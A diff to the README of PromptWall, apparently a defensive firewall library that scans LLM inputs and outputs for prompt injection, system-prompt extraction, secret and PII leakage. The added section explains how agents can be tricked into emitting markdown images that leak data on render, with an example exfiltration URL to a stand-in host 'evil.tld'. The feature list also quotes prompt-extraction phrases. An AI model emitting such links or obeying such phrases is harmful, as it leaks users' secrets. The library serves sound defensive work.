@@ -9,6 +9,8 @@ LLMs into trouble:
 - 🕵️ **System-prompt exfiltration** — "repeat the words above", "what are your instructions?"
 - 🔑 **Secret leakage** — API keys, tokens, private keys reaching the model or a log
 - 🪪 **PII leakage** — emails, payment cards (Luhn-checked), phone numbers, national IDs
+- 🎣 **Data-exfiltration channels** — markdown images/links that leak data to an
+  attacker server when a chat UI renders them (the "tracking-pixel" attack)
 - 👻 **Obfuscation** — zero-width characters, homoglyphs, unicode-tag smuggling, and
   base64/hex payloads that decode to hidden instructions
 
@@ -85,6 +87,41 @@ Firewall(policy=Policy(block_at=Severity.CRITICAL, redact=True))  # custom
 `AUDIT_POLICY` is ideal for a **shadow rollout**: log what *would* have been
 blocked without touching live traffic, then tighten the policy once you trust it.
 
+### Data-exfiltration channels & domain allowlist
+
+Agents that browse or read untrusted documents can be tricked into emitting a
+markdown image whose URL smuggles data out — no click required, the UI fetches
+it on render. PromptWall flags these, and can enforce an allowlist of hosts your
+app is actually allowed to link to:
+
+```python
+from promptwall import Firewall
+
+fw = Firewall.from_config({"allowed_domains": ["yourapp.com", "github.com"]})
+fw.scan_output("![x](https://evil.tld/log?d=SECRET)").blocked   # True
+fw.scan_output("![ok](https://cdn.yourapp.com/logo.png)").allowed  # True
+```
+
+### Custom rules (config)
+
+Add your own patterns (internal ticket ids, code names, banned strings) without
+writing code. Custom rules extend the built-ins — a config only adds coverage:
+
+```json
+{
+  "policy": {"block_at": "high", "redact": true},
+  "allowed_domains": ["yourapp.com"],
+  "rules": [
+    {"name": "internal_ticket", "category": "internal", "severity": "medium",
+     "patterns": ["\\bACME-[0-9]{6}\\b"]}
+  ]
+}
+```
+
+```python
+fw = Firewall.from_config("promptwall.json")
+```
+
 ## CLI
 
 ```bash
@@ -99,7 +136,8 @@ REDACT [output] severity=medium
 redacted:
 contact me at [REDACTED:PII]
 
-$ promptwall scan --json "..."      # machine-readable report
+$ promptwall scan --json "..."             # machine-readable report
+$ promptwall scan -c promptwall.json "..." # use a custom-rules config
 ```
 
 Exit codes make it easy to gate a pipeline: **0** clean · **1** blocked ·
@@ -157,8 +195,13 @@ Detectors are pluggable — subclass `Detector`, implement
 
 ```bash
 pip install -e ".[dev]"
-pytest -q          # 99 tests, all offline
+pytest -q          # 118 tests, all offline
 ```
+
+**CI:** a ready-to-use GitHub Actions workflow is at
+[`docs/ci-workflow.yml`](docs/ci-workflow.yml); move it to
+`.github/workflows/tests.yml` to run the suite on every push across Python
+3.9–3.13.
 
 ## License
 
